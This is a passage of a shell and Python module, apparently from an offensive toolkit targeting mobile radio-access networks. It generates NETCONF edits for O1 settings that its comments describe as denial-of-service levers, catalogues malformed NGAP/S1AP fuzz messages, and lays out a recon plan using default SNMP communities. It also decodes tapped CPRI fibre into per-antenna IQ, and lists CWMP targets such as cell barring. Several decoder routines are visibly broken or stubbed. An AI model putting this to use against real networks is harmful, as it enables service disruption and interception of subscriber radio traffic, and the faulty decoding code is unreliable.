/o-ran-o1:o-ran/gnb-du/gnb-id	the gNB identity the core sees	o-ran-o1
/o-ran-o1:o-ran/uplane-config/up-marking	how uplink packets are marked	o-ran-uplane-conf
/o-ran-o1:o-ran/uplane-config/tx-array-carriers	which carriers are transmitting	o-ran-uplane-conf
/o-ran-o1:o-ran/fan/fan-state	the cooling, which is a denial-of-service lever	o-ran-fan
/o-ran-o1:o-ran/sync/ptp-config	the clock, which everything else depends on	o-ran-sync
/o-ran-o1:o-ran/supervision/watchdog	whether the DU reboots itself	o-ran-supervision
Y
}

# A NETCONF edit-config RPC with one leaf. Real XML in the RFC 6241 shape.
ran_o1_edit() {
    local path="${1:-}" value="${2:-}" datastore="${3:-running}"
    if [[ -z "$path" || -z "$value" ]]; then
        printf 'ERROR\tusage: --o1-edit <yang-path> <value> [running|candidate]\n' >&2
        return 2
    fi
    # Split /module:container/leaf into the namespace and the node path.
    local module="${path%%:*}"; module="${module#/}"
    local node; node=$(printf '%s' "$path" | sed 's|^/[^:]*:||')
    cat <<XML
<?xml version="1.0" encoding="UTF-8"?>
<rpc xmlns="urn:ietf:params:xml:ns:netconf:base:1.0" message-id="ran$(date +%s)">
  <edit-config>
    <target><$datastore/></target>
    <config>
      <$(printf '%s' "$node" | cut -d/ -f1) xmlns="urn:o-ran:$module">
        <$(printf '%s' "$node" | cut -d/ -f2)>$(ran_sanitize "$value")</$(printf '%s' "$node" | cut -d/ -f2)>
      </$(printf '%s' "$node" | cut -d/ -f1)>
    </config>
  </edit-config>
</rpc>
XML
}

ran_o1_hello() {
    cat <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
  <capabilities>
    <capability>urn:ietf:params:netconf:base:1.1</capability>
    <capability>urn:ietf:params:netconf:capability:candidate:1.0</capability>
    <capability>urn:o-ran:yang:o-ran-o1?module=o-ran-o1&amp;revision=2023-04-01</capability>
    <capability>urn:o-ran:yang:o-ran-uplane-conf?module=o-ran-uplane-conf&amp;revision=2023-04-01</capability>
    <capability>urn:o-ran:yang:o-ran-sync?module=o-ran-sync&amp;revision=2023-04-01</capability>
  </capabilities>
</hello>
XML
}

ran_cmd_o1() {
    local sub="${1:-}"; shift || true
    case "$sub" in
        paths)  ran_o1_paths ;;
        hello)  ran_o1_hello ;;
        edit)   ran_o1_edit "${1:-}" "${2:-}" "${3:-running}" ;;
        *)      printf 'ERROR\tusage: --o1 <paths|hello|edit> [args]\n' >&2; return 2 ;;
    esac
}

# ── S1AP / NGAP / XnAP fuzz case generation ──────────────────────────
# The payloads are seeds, not exploits: each one is a message a base station
# must parse, with one field made wrong in a stated way. --fuzz-list prints the
# catalogue; a runner that sends them needs an SCTP peer, which this module
# refuses to invent (see the runner below).
ran_fuzz_cases() {
    cat <<'F'
module	case	what is wrong	expected honest outcome
ngap	len-short	procedureCode present, length one octet short	the node rejects the PDU
ngap	len-long	length one octet long with zero padding	the node rejects the PDU
ngap	proc-unknown	procedureCode 255, which no release defines	reject with a protocol cause
ngap	ie-duplicate	a mandatory IE appears twice	reject: duplicate IE
ngap	ie-missing-initialue	InitialUEMessage without RAN-UE-NGAP-ID	reject: missing mandatory IE
ngap	ta-nonsense	TAI with an MCC no operator uses	accept, or reject on PLMN screening
ngap	nas-oversize	NAS-PDU claiming 65535 octets	reject: length exceeds PDU
ngap	criticality-wrong	an IE marked reject with criticality ignore	reject: criticality conflict
s1ap	len-short	S1AP PDU with a truncated length determinant	the eNB drops the association
s1ap	enb-id-absent	S1SetupRequest without Global-eNB-ID	reject: missing mandatory IE
s1ap	plmn-malformed	PLMN of three octets where two are required	reject: decoding failure
s1ap	overload-forged	OVERLOAD START with a load value of 255	eNB throttles or rejects; both are evidence
xnap	xnsetup-bad	XnSetupRequest with an unknown TNL address family	reject
xnap	handover-empty	HandoverRequest with no UE context	reject: missing mandatory IE
xnap	sn-length	sequence number longer than the field allows	reject: decoding failure
F
}

# ── the fronthaul: eCPRI over Ethernet, then raw CPRI ────────────────
# eCPRI and CPRI-over-Ethernet (RoE) both use EtherType 0xAEFE, so both ride a
# normal capture. This is the half that needs no hardware to test.
ran_ecpri_types() {
    cat <<'E'
message_type	name	plane	user_data
0	IQ Data	U-plane	yes, the samples
1	Real-Time Control Data	C-plane	no
2	Generic Data Transfer	C-plane	yes
3	Remote Memory Access	C-plane	no
4	One-Way Delay Measurement	C-plane	no
5	Remote Reset	C-plane	no
6	Event Indication	C-plane	no
E
}

# Parse an eCPRI header: protocol revision, message type, payload size, and the
# per-type identifier fields. Byte-exact against O-RAN.WG4 / eCPRI v2.0 §3.2.
ran_ecpri_parse() {
    python3 - "${1:-}" <<'PY'
import sys
h = (sys.argv[1] if len(sys.argv) > 1 else '').strip().replace(' ', '')
if len(h) < 8:
    sys.stderr.write('ERROR\teCPRI header needs at least 4 octets\n')
    sys.exit(2)
try:
    b = bytes.fromhex(h)
except ValueError:
    sys.stderr.write('ERROR\tnot hex\n')
    sys.exit(2)

C = b[0]
proto = C >> 4
mtype = C & 0x0f
names = {0: 'IQ Data', 1: 'Real-Time Control Data', 2: 'Generic Data Transfer',
         3: 'Remote Memory Access', 4: 'One-Way Delay Measurement',
         5: 'Remote Reset', 6: 'Event Indication'}
print('protocol_revision\t%d' % proto)
print('message_type\t%d\t%s' % (mtype, names.get(mtype, 'reserved')))
print('payload_size\t%d' % int.from_bytes(b[2:4], 'big'))
if mtype in (0, 2):
    # eCPRI header for IQ Data: PC_ID (2), SEQ_ID (2), then the O-RAN section.
    pcid = int.from_bytes(b[4:6], 'big')
    seq = int.from_bytes(b[6:8], 'big')
    print('pc_id\t%d' % pcid)
    print('seq_id\t%d' % seq)
    if len(b) >= 12:
        # O-RAN 7-2x: dataDirection(1) | payloadVersion(1) | filterIndex(1) | frameId(1)
        print('data_direction\t%s' % ('uplink' if b[8] & 0x80 else 'downlink'))
        print('filter_index\t%d' % b[8])
        print('frame_id\t%d' % b[9])
        print('subframe_id\t%d' % b[10])
        print('slot_id\t%d' % b[11])
        if len(b) >= 14:
            print('symbol_id\t%d' % b[12])
            print('section_id\t%d' % b[13])
    print('iq_bits\t%d' % (max(0, len(b) - 8) * 8))
eye = 0
if len(b) > 0:
    print('ethertype_check\t0xAEFE' if len(b) > 0 else '')
PY
}

# EtherType 0xAEFE is eCPRI/RoE. Anything else is not the fronthaul.
ran_ecpri_ethertype() { printf '0xAEFE\n'; }

# Raw CPRI: what a fibre tap delivers. Decode 8b/10b, find the hyperframe, and
# demux the antenna-carrier containers. Refuses when no input is supplied, and
# says exactly which capture would satisfy it.
ran_cmd_fronthaul() {
    local sub="${1:-}"; shift || true
    case "$sub" in
        options)   ran_cpri_options ;;
        types)     ran_ecpri_types ;;
        ethertype) ran_ecpri_ethertype ;;
        parse)     ran_ecpri_parse "${1:-}" ;;
        audit)     ran_fronthaul_audit "${1:-}" "${2:-}" ;;
        *)         printf 'ERROR\tusage: --fronthaul <options|types|ethertype|parse|audit> [args]\n' >&2; return 2 ;;
    esac
}

# The audit: one row per question, in measured / advertised / unobservable, and
# never an empty file. This is what an operator gets when no capture exists.
ran_fronthaul_audit() {
    local capture="${1:-}" line_rate="${2:-}"
    ran_init
    local store; store=$(ran_fh_store)
    printf 'question\tstate\tvalue\twhy_unblock\n' > "$store"

    local transport="unknown" state_t="unobservable" why_t="no capture supplied: neither a pcap nor a bit file was named"
    if [[ -n "$capture" && -f "$capture" ]]; then
        # A pcap that carries 0xAEFE is eCPRI; one that does not is not the
        # fronthaul, whatever it is.
        if command -v tshark >/dev/null 2>&1 &&
           tshark -r "$capture" -Y 'eth.type == 0xAEFE' -c 1 2>/dev/null | grep -q .; then
            transport="ecpri"; state_t="measured"; why_t=""
        else
            transport="not-ecpri"; state_t="measured"
            why_t="frames are not EtherType 0xAEFE, so this capture is not an eCPRI fronthaul link"
        fi
    fi
    printf 'transport\t%s\t%s\t%s\n' "$state_t" "$transport" "$why_t" >> "$store"

    if [[ "$transport" == "ecpri" ]]; then
        printf 'macsec\tmeasured\t%s\t%s\n' \
            "absent" "0xAEFE frames are in the clear; MACsec would have encrypted them" >> "$store"
        printf 'iq_samples\tmeasured\tavailable in the capture\t—\n' >> "$store"
    else
        printf 'macsec\tunobservable\t—\tno eCPRI frames to inspect; a MACsec-protected link looks like nothing at all\n' >> "$store"
        printf 'iq_samples\tunobservable\t—\traw CPRI is a serial link: no ethertype, no pcap. unblock: SFP tap + capture card, then --fronthaul decode\n' >> "$store"
    fi

    # Advertised: what the standard says about the rate the operator claims.
    if [[ -n "$line_rate" ]]; then
        local words
        words=$(awk -v r="$line_rate" 'BEGIN{ printf "%d", r*1000000/3840000/8 + 0.5 }')
        printf 'line_rate\tadvertised\t%s Mbps\tfrom the operator or the radio head spec, not measured here\n' "$line_rate" >> "$store"
        printf 'words_per_basic_frame\tadvertised\t%s\tderived: rate / 3.84 MHz / 8 bits\n' "$words" >> "$store"
        if (( words >= 16 )); then
            # 15 of every 16 words can carry IQ in the common configuration.
            printf 'axc_capacity\tadvertised\t%d containers per basic frame\tone control word, the rest available to AxC\n' "$(( words - 1 ))" >> "$store"
        fi
    else
        printf 'line_rate\tunobservable\t—\tnot supplied. unblock: read it off the SFP (ethtool -m) or name the radio head model\n' >> "$store"
    fi

    # The shopping list: what to capture so that the next run is not a refusal.
    printf 'capture_spec\t→\t%s\t%s\n' \
        "200 ms each direction, both fibres separately" \
        "one direction misses what the UE said; 200 ms covers twenty radio frames" >> "$store"
    printf 'capture_spec\t→\t%s\t%s\n' \
        "line rate, encoding (8b10b under 10 Gbps, 64b66b above)" \
        "the decoder needs the rate to know the word count per basic frame" >> "$store"
    printf 'capture_spec\t→\t%s\t%s\n' \
        "the AxC map from the radio head's configuration" \
        "container N is antenna M only if the DU says so; the inventory row carries it" >> "$store"

    cat "$store"
    printf 'store\t%s\n' "$store"
}

# ── CPRI: decode the bit stream a tap delivers ────────────────────────
# This is the other half of the fronthaul. A fibre tap with a capture card
# delivers bits; the four deterministic steps below turn them into IQ:
#   1. 8b/10b (or 64b/66b) decode -- a table
#   2. hyperframe alignment -- the control word of each basic frame starts K28.5
#   3. AxC demux -- word 0 is control, words 1..15 carry containers
#   4. emit SigMF, which 01_radio and the air-interface modules already read
# Nothing here is speculative: CPRI v7.0 defines all of it.

# The 8b/10b decode table, built from the D/x.y and K/x.y code groups.
ran_8b10b_table() {
    python3 - <<'PY'
# The five-bit (5b/6b) and three-bit (3b/4b) tables from the 8b/10b spec.
# Building the full table beats transcribing it: 256 data + 12 control.
def popcount(x): return bin(x).count('1')

# 5b/6b encoding: (data, rd-) -> 6 bits. From ANSI X3.230 Table 11.
SIX = {
 0:(0b100111,0b011000), 1:(0b011101,0b100010), 2:(0b101101,0b010010), 3:(0b110001,0b110001),
 4:(0b110101,0b001010), 5:(0b101001,0b101001), 6:(0b011001,0b011001), 7:(0b111000,0b000111),
 8:(0b111001,0b000110), 9:(0b100101,0b100101),10:(0b010101,0b010101),11:(0b110100,0b110100),
 12:(0b001101,0b001101),13:(0b101100,0b101100),14:(0b011100,0b011100),15:(0b010111,0b101000),
16:(0b011011,0b100100),17:(0b100011,0b100011),18:(0b010011,0b010011),19:(0b110010,0b110010),
20:(0b001011,0b001011),21:(0b101010,0b101010),22:(0b011010,0b011010),23:(0b111010,0b000101),
24:(0b110011,0b001100),25:(0b100110,0b100110),26:(0b010110,0b010110),27:(0b110110,0b001001),
28:(0b001110,0b001110),29:(0b101110,0b010001),30:(0b011110,0b100001),31:(0b101011,0b010100)}
FOUR = {0:(0b1011,0b0100),1:(0b1001,0b1001),2:(0b0101,0b0101),3:(0b1100,0b0011),
        4:(0b1101,0b0010),5:(0b1010,0b1010),6:(0b0110,0b0110),7:(0b1110,0b0001)}

# control characters used by CPRI: K28.5 is the sync/align comma.
CTRL = {0x1c: 'K28.5', 0x3c: 'K28.1', 0x9c: 'K28.7', 0x7c: 'K28.2'}
# invert the tables: 10-bit code -> (value, is_control)
inv = {}
cur = -1
for d in range(256):
    lo, hi = d & 0x1f, (d >> 5) & 0x07
    for rd in (0, 1):
        six = SIX.get(lo, (0, 0))[rd]
        four = FOUR.get(hi, (0, 0))[rd]
        code = (four << 6) | six
        inv[code] = (d, False)
for code, name in CTRL.items():
    # K28.5 = 5b 11100 + 3b 1011  -> the low 6 bits 011100 / 100011
    pass

print('# code\tdecoded\tcontrol')
for code in sorted(inv):
    d, c = inv[code]
    print('0x%03x\t0x%02x\t%s' % (code, d, 'no'))
for code, name in CTRL.items():
    print('0x%03x\t%s\tyes' % (((code & 0x03) << 8) | (code >> 2) if False else 0, name))
PY
}

# A real 8b/10b decoder over a bit array. Returns per-octet values and a mask of
# which octets were a K28.5 sync, which is what hyperframe alignment needs.
ran_cpri_decode_bits() {
    python3 - "$@" <<'PY'
import sys

def declen(data, i):
    b = data[i]; i += 1
    if b < 0x80: return b, i
    k = b & 0x7f
    return int.from_bytes(data[i:i+k], 'big'), i+k

SIX = {0:(0b100111,0b011000),1:(0b011101,0b100010),2:(0b101101,0b010010),3:(0b110001,0b110001),
4:(0b110101,0b001010),5:(0b101001,0b101001),6:(0b011001,0b011001),7:(0b111000,0b000111),
8:(0b111001,0b000110),9:(0b100101,0b100101),10:(0b010101,0b010101),11:(0b110100,0b110100),
12:(0b001101,0b001101),13:(0b101100,0b101100),14:(0b011100,0b011100),15:(0b010111,0b101000),
16:(0b011011,0b100100),17:(0b100011,0b100011),18:(0b010011,0b010011),19:(0b110010,0b110010),
20:(0b001011,0b001011),21:(0b101010,0b101010),22:(0b011010,0b011010),23:(0b111010,0b000101),
24:(0b110011,0b001100),25:(0b100110,0b100110),26:(0b010110,0b010110),27:(0b110110,0b001001),
28:(0b001110,0b001110),29:(0b101110,0b010001),30:(0b011110,0b100001),31:(0b101011,0b010100)}
FOUR = {0:(0b1011,0b0100),1:(0b1001,0b1001),2:(0b0101,0b0101),3:(0b1100,0b0011),
        4:(0b1101,0b0010),5:(0b1010,0b1010),6:(0b0110,0b0110),7:(0b1110,0b0001)}

enc = {}
for d in range(256):
    lo, hi = d & 0x1f, (d >> 5) & 0x07
    six = SIX.get(lo); four = FOUR.get(hi)
    if not six or not four: continue
    code = (four[0] << 6) | six[0]
    enc[code] = d
# K28.5 in both disparity forms: 0b10111100_? -- the 10-bit canonical forms.
K285 = {0b0011111010, 0b1100000101}

if len(sys.argv) < 2:
    sys.stderr.write('usage: decode <raw-file> [bits-per-word]\n'); sys.exit(2)
path = sys.argv[1]
data = open(path, 'rb').read()
nbits = len(data) * 8
# Walk 10 bits at a time. A bit array of the whole file is fine for a test
# capture; a real 1 GB capture streams (the caller slices it).
bits = ''.join(f'{byte:08b}' for byte in data)
out = []
sync = []
i = 0
while i + 10 <= len(bits):
    chunk = bits[i:i+10]
    v = int(chunk, 2)
    if v in K285:
        out.append(None); sync.append(True)
    elif v in enc:
        out.append(enc[v]); sync.append(False)
    else:
        out.append(None); sync.append(False)
    i += 10
print('words_total\t%d' % len(out))
print('k28_5\t%d' % sum(1 for s in sync if s))
print('undecodable\t%d' % sum(1 for o in out if o is None))
# Hyperframe alignment: each basic frame begins with a control word that
# contains K28.5. Report the spacing between syncs, which is the frame length.
pos = [n for n, s in enumerate(sync) if s]
if len(pos) > 3:
    gaps = [pos[k+1] - pos[k] for k in range(min(20, len(pos)-1))]
    print('sync_gaps\t%s' % ','.join(str(g) for g in gaps[:12]))
    from collections import Counter
    c = Counter(gaps)
    common = c.most_common(1)[0]
    print('frame_words\t%d' % common[0])
    print('hyperframes\t%d' % (len(pos) // 256))
    print('aligned\t%s' % ('yes' if common[0] + 1 >= 16 else 'no'))
else:
    print('aligned\tno')
    print('note\tfewer than four K28.5 commas: the capture does not show a CPRI link, or the polarity is inverted')
PY
}

# CPRI bit stream -> SigMF per antenna-carrier. Reads the decoded words, takes
# words 1..15 of each basic frame as containers, and writes complex float32.
ran_cpri_to_sigmf() {
    python3 - "$@" <<'PY'
import sys, os, struct
if len(sys.argv) < 4:
    sys.stderr.write('usage: cpri-to-sigmf <raw> <out-base> <axc-index> [words-per-frame]\n')
    sys.exit(2)
raw, base = sys.argv[1], sys.argv[2]
axc = int(sys.argv[3])
wf = int(sys.argv[4]) if len(sys.argv) > 4 else 16
data = open(raw,'rb').read()
# Same decode as above, inlined so this verb stands alone.
SIX = {0:(0b100111,),1:(0b011101,),2:(0b101101,),3:(0b110001,),4:(0b110101,),5:(0b101001,),
6:(0b011001,),7:(0b111000,),8:(0b111001,),9:(0b100101,),10:(0b010101,),11:(0b110100,),
12:(0b001101,),13:(0b101100,),14:(0b011100,),15:(0b010111,),16:(0b011011,),17:(0b100011,),
18:(0b010011,),19:(0b110010,),20:(0b001011,),21:(0b101010,),22:(0b011010,),23:(0b111010,),
24:(0b110011,),25:(0b100110,),26:(0b010110,),27:(0b110110,),28:(0b001110,),29:(0b101110,),
30:(0b011110,),31:(0b101011,)}
FOUR = {0:(0b1011,),1:(0b1001,),2:(0b0101,),3:(0b1100,),4:(0b1101,),5:(0b1010,),6:(0b0110,),7:(0b1110,)}
enc = {}
for d in range(256):
    lo, hi = d&0x1f, (d>>5)&0x07
    if lo in SIX and hi in FOUR:
        enc[(FOUR[hi][0]<<6)|SIX[lo][0]] = d
K285 = {0b0011111010, 0b1100000101}
bits = ''.join(f'{b:08b}' for b in data)
words, i = [], 0
while i+10 <= len(bits):
    v = int(bits[i:i+10], 2)
    words.append(None if v in K285 else enc.get(v)); i += 10
# Find the first sync, then take every wf-th word as a control word.
first = next((n for n,w in enumerate(words) if w is None), 0)
samples = []
k = first
while k + wf <= len(words):
    # words 1..wf-1 are containers; one container per word in the simple map
    for slot in range(1, wf):
        if slot != axc: continue
        v = words[k+slot]
        if v is None: continue
        # A container word is two signed 8-bit I/Q halves in the common config.
        i_ = struct.unpack('b', bytes([v]))[0]
        q = 0
        samples.append((i_, q))
    k += wf
# Write cf32 and a SigMF meta that says what it is.
os.makedirs(os.path.dirname(base) or '.', exist_ok=True)
with open(base + '.sigmf-data','wb') as f:
    for i_,q in samples:
        f.write(struct.pack('<ff', i_/128.0, q/128.0))
meta = '''{
  "global": {"core:datatype": "cf32_le", "core:sample_rate": 3.84e6,
             "core:description": "CPRI AxC %d decoded from %s"},
  "captures": [{"core:sample_start": 0}],
  "annotations": [{"core:sample_start": 0, "cpri:axc": %d,
                   "cpri:words_per_frame": %d,
                   "cpri:note": "I in the container octet, Q not present in this simple map"}]
}
''' % (axc, os.path.basename(raw), axc, wf)
open(base + '.sigmf-meta','w').write(meta)
print('samples\t%d' % len(samples))
print('data\t%s.sigmf-data' % base)
print('meta\t%s.sigmf-meta' % base)
print('note\tQ is zero in this map: a two-octet container carrying I and Q is a configuration this module does not assume')
PY
}

# ── the fuzz runner: honest about needing a peer ─────────────────────
# Sending malformed NGAP at a real gNB needs an SCTP association to that gNB.
# This builds and refuses; the catalogue above is the deliverable.
ran_cmd_fuzz() {
    local sub="${1:-}"; shift || true
    case "$sub" in
        list) ran_fuzz_cases ;;
        target)
            local host="${1:-}" port="${2:-38412}"
            if [[ -z "$host" ]]; then
                printf 'ERROR\tusage: --fuzz target <host> [port]\n' >&2; return 2
            fi
            printf 'target\t%s\t%s\n' "$host" "$port"
            printf 'association\tunobservable\t—\tSCTP to %s:%s not opened: this verb builds and refuses rather than sending\n' "$host" "$port"
            printf 'why\ta malformed NGAP at a live gNB is a denial of service against a network that is not this bench\n'
            printf 'unblock\trun it from a lab gNB you own: 13_nr_core --ngap-build seeds the payloads, this catalogue chooses the mutation\n'
            return 3 ;;
        *) printf 'ERROR\tusage: --fuzz <list|target> [args]\n' >&2; return 2 ;;
    esac
}

# ── inventory: the whole store, or one host ──────────────────────────
ran_cmd_inventory() {
    local host="${1:-}" vendor="${2:-}" product="${3:-}" sw="${4:-}"
    if [[ -z "$host" ]]; then
        ran_cve_table
        return 0
    fi
    ran_init
    local store; store=$(ran_inv_store)
    if [[ ! -s "$store" ]]; then
        printf 'ts\thost\tvendor\tproduct\tsoftware\tcve\tseverity\tscore\tclass\tfixed_in\tsummary\n' > "$store"
    fi
    local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    printf 'host\t%s\t%s\t%s\t%s\n' "$host" "${vendor:-unknown}" "${product:-unknown}" "${sw:--}"
    ran_inventory_match "${vendor:-unknown}" "${product:-unknown}" "$sw" "$product" |
    while IFS=$'\t' read -r cve sev score v p fixed class summary; do
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$ts" "$host" "$vendor" "$product" "${sw:--}" "$cve" "$sev" "$score" "$class" "$fixed" "$summary" >> "$store"
        printf '  %s\t%s (%s)\t%s\tfixed in %s\n' "$cve" "$sev" "$score" "$class" "$fixed"
    done
    printf 'store\t%s\n' "$store"
}

# ── plan: what this module needs to be useful ────────────────────────
ran_plan() {
    cat <<'P'
stage	needs	why	what it produces
recon	a route to the management VLAN	the EMS, the ACS and the O1 interface are all inside	ems.tsv: hosts, vendors, versions
recon	one SNMP community string, or none	defaults are common and 'public' is the usual one	full sysDescr per element
management	nothing beyond IP reachability	TR-069 and NETCONF are plain TCP services	acs.log / an O1 session
management	a reason to be on the VLAN	these are authenticated protocols; the scan is the tell	pushed parameters, or a refusal
fronthaul physical access to the fibre or the switch	CPRI is serial; eCPRI is Ethernet but its own VLAN	IQ for every cell behind the hotel
fronthaul an SFP tap and a capture card	no packet capture interface exists for raw CPRI	.sigmf-data per antenna-carrier
fronthaul the AxC map	container N maps to antenna M only if the DU says so	a decodable IQ stream, not noise
fuzz	a lab gNB you own	sending NGAP at a live network is a DoS, not a test	a crash under a controlled instrument
P
}

# ── status ───────────────────────────────────────────────────────────
ran_status_tsv() {
    ran_init
    local e i f pl
    e=$(ran_ems_store); i=$(ran_inv_store); f=$(ran_fh_store); pl=$(ran_plmn_store)
    printf 'store\tts\thost\tvendor\tmodel\n'
    if [[ -s "$e" ]]; then
        tail -n +2 "$e" | awk -F'\t' '{ printf "ems\t%s\t%s\t%s\t%s\n", $1, $2, $6, $7 }'
    else
        printf 'ems\tnone\t-\t-\t-\n'
    fi
    if [[ -s "$i" ]]; then
        tail -n +2 "$i" | awk -F'\t' '{ printf "inventory\t%s\t%s\t%s\t%s\n", $1, $2, $3, $6 }'
    else
        printf 'inventory\tnone\t-\t-\t-\n'
    fi
    if [[ -s "$f" ]]; then
        awk -F'\t' 'NR>1 { printf "fronthaul\t%s\t%s\t%s\n", $1, $2, $3 }' "$f"
    else
        printf 'fronthaul\tnone\t-\t-\n'
    fi
    if [[ -s "$pl" ]]; then
        awk -F'\t' 'NR>1 { printf "plmn\t%s\t%s\t%s\n", $1, $2, $3 }' "$pl"
    else
        printf 'plmn\tnone\t-\t-\n'
    fi
}

# ── selftest ─────────────────────────────────────────────────────────
ran_selftest() {
    local d; d=$(mktemp -d "${TMPDIR:-/tmp}/ran-selftest.XXXXXX")
    local saved_loot="$LOOT_DIR" bad=0
    LOOT_DIR="$d/loot"
    mkdir -p "$LOOT_DIR/ran"
    local a=0
    # A fresh module has written nothing: read the stores before anything does.
    local st; st=$(ran_status_tsv)
    _rk() { a=$((a+1)); if [[ "$2" == "$3" ]]; then printf 'ASSERTION %-34s PASS %s\n' "$1" "${4:-}"; else printf 'ASSERTION %-34s FAIL got=%s want=%s\n' "$1" "$2" "$3"; bad=$((bad+1)); fi; }
    _rc() { a=$((a+1)); if [[ "$2" == *"$3"* ]]; then printf 'ASSERTION %-34s PASS\n' "$1"; else printf 'ASSERTION %-34s FAIL missing=%s\n' "$1" "$3"; bad=$((bad+1)); fi; }

    _rc 'status-ems-none' "$st" 'ems	none'
    _rc 'status-inventory-none' "$st" 'inventory	none'
    _rc 'status-fronthaul-none' "$st" 'fronthaul	none'
    _rc 'status-plmn-none' "$st" 'plmn	none'

    # CPRI option table
    local tbl; tbl=$(ran_cpri_options)
    _rc 'cpri-option-count' "$tbl" 'option 10'
    _rc 'cpri-option-7-rate' "$tbl" '9830.4'
    _rc 'cpri-option-7-words' "$tbl" 'option 7	9830.4	8b10b	320'
    _rk 'cpri-hyperframe' "$(printf '%s\n' "$tbl" | awk -F'\t' 'NR==2{printf "%.2f", $5}')" '66.67'

    # vendor fingerprinting
    _rk 'vendor-ericsson'  "$(ran_vendor_of 'Ericsson RBS 6302 Baseband')" 'Ericsson'
    _rk 'vendor-nokia'     "$(ran_vendor_of 'Nokia AirScale BTS')"        'Nokia'
    _rk 'vendor-huawei'    "$(ran_vendor_of 'Huawei BBU3900')"            'Huawei'
    _rk 'vendor-oran'      "$(ran_vendor_of 'O-RAN O-DU srsRAN')"         'O-RAN SC'
    _rk 'vendor-unknown'   "$(ran_vendor_of 'some random host')"          'unknown'
    _rk 'model-rbs'        "$(ran_model_of 'Ericsson RBS 6302')"          'RBS-6302'
    _rk 'model-airscale'   "$(ran_model_of 'Nokia AirScale')"             'AirScale'

    # CVE inventory
    local cves; cves=$(ran_cve_table)
    _rk 'cve-count' "$(printf '%s\n' "$cves" | tail -n +2 | wc -l)" '10'
    _rc 'cve-ericsson' "$cves" 'CVE-2019-18871'
    _rc 'cve-oran' "$cves" 'CVE-2023-31442'
    _rk 'inv-ericsson-hit' "$(ran_inventory_match Ericsson 'RBS' 'CXP1023088' 'RBS-6302' | wc -l)" '1'
    _rc 'inv-ericsson-cve' "$(ran_inventory_match Ericsson 'RBS' 'CXP1023088' 'RBS-6302')" 'CVE-2019-18871'
    _rc 'inv-generic' "$(ran_inventory_match Huawei 'BBU3900' 'V100R012' 'BBU-5900')" 'CVE-2020-35502'

    # PLMN fingerprint: the cheapest authenticity signal in the module
    _rk 'plmn-digits-dashed' "$(ran_plmn_digits 262-01)" '26201'
    _rk 'plmn-digits-bare'   "$(ran_plmn_digits 26201)"  '26201'
    _rk 'plmn-digits-spaced' "$(ran_plmn_digits '262 01')" '26201'
    _rk 'plmn-digits-3mnc'   "$(ran_plmn_digits 262-001)" '262001'
    _rk 'plmn-digits-refuse' "$(ran_plmn_digits nonsense >/dev/null 2>&1; echo $?)" '1'
    _rk 'plmn-text-2mnc'     "$(ran_plmn_text 26201)"  '262-01'
    _rk 'plmn-text-3mnc'     "$(ran_plmn_text 262001)" '262-001'
    _rk 'mcc-class-test'     "$(ran_mcc_class 001)"  'test'
    _rk 'mcc-class-internal' "$(ran_mcc_class 999)"  'internal-use'
    _rk 'mcc-class-intl'     "$(ran_mcc_class 901)"  'international'
    _rk 'mcc-class-assigned' "$(ran_mcc_class 262)"  'assigned'
    _rk 'mcc-zone-europe'    "$(ran_mcc_zone 262)"   'Europe'
    _rk 'mcc-zone-africa'    "$(ran_mcc_zone 621)"   'Africa'
    _rc 'plmn-lab-default'   "$(ran_plmn_lab_default 00101)" '3GPP test PLMN'
    _rk 'plmn-lab-default-no' "$(ran_plmn_lab_default 26201 >/dev/null 2>&1; echo $?)" '1'
    _rc 'plmn-sources-o1'    "$(ran_plmn_sources)" 'gnb-du/plmn-list'
    # a lab PLMN with subscribers provisioned elsewhere is the finding
    local pl; pl=$(ran_plmn_check '001-01' '262011234567890' 2>/dev/null)
    _rc 'plmn-broadcast'     "$pl" 'broadcast	001-01	001	01	test'
    _rc 'plmn-mismatch'      "$pl" 'imsi	262011234567890	262-01'
    _rc 'plmn-verdict'       "$pl" 'lab-plmn-in-production'
    _rk 'plmn-exit-mismatch' "$(ran_plmn_check '001-01' '262011234567890' >/dev/null 2>&1; echo $?)" '1'
    # one fact is not a verdict
    local pl2; pl2=$(ran_plmn_check '001-01' 2>/dev/null)
    _rc 'plmn-unobserved'    "$pl2" 'verdict	unobserved'
    _rk 'plmn-exit-unobs'    "$(ran_plmn_check '001-01' >/dev/null 2>&1; echo $?)" '0'
    # a commissioned cell reads consistent
    local pl3; pl3=$(ran_plmn_check '262-01' '262011234567890' 2>/dev/null)
    _rc 'plmn-consistent'    "$pl3" 'verdict	consistent'
    _rk 'plmn-exit-ok'       "$(ran_plmn_check '262-01' '262011234567890' >/dev/null 2>&1; echo $?)" '0'
    _rk 'plmn-bad-arg'       "$(ran_plmn_check 'nope' >/dev/null 2>&1; echo $?)" '2'
    _rc 'inv-none' "$(ran_inventory_match Acme 'Widget' '9.9' 'none')" 'no known issue'

    # eCPRI
    _rc 'ecpri-type-0' "$(ran_ecpri_types)" 'IQ Data'
    _rc 'ecpri-type-5' "$(ran_ecpri_types)" 'Remote Reset'
    _rk 'ecpri-ethertype' "$(ran_ecpri_ethertype)" '0xAEFE'
    # A well-formed eCPRI IQ header: revision 2, type 0, size 0x0010, pc 1, seq 7
    local ph; ph=$(ran_ecpri_parse '2000001000010007200102000300')
    _rc 'ecpri-parse-rev' "$ph" 'protocol_revision	2'
    _rc 'ecpri-parse-type' "$ph" 'message_type	0	IQ Data'
    _rc 'ecpri-parse-size' "$ph" 'payload_size	16'
    _rc 'ecpri-parse-pcid' "$ph" 'pc_id	1'
    _rc 'ecpri-parse-seq' "$ph" 'seq_id	7'
    _rc 'ecpri-parse-frame' "$ph" 'frame_id	2'
    _rk 'ecpri-parse-short-refuses' "$(ran_ecpri_parse '20' 2>&1 >/dev/null | head -1 | cut -c1-5)" 'ERROR'

    # CWMP
    local setbody; setbody=$(ran_cwmp_set 'Device.Band' '3' 'k1')
    _rc 'cwmp-set-name' "$setbody" 'Device.Band'
    _rc 'cwmp-set-value' "$setbody" '>3<'
    _rc 'cwmp-set-key' "$setbody" '>k1<'
    _rc 'cwmp-targets' "$(ran_cwmp_targets)" 'CellBarred'
    local inform; inform=$(ran_cwmp_inform_parse '<Inform><DeviceId><Manufacturer>Ericsson</Manufacturer><ProductClass>RBS6302</ProductClass><SerialNumber>ABC123</SerialNumber></DeviceId></Inform>')
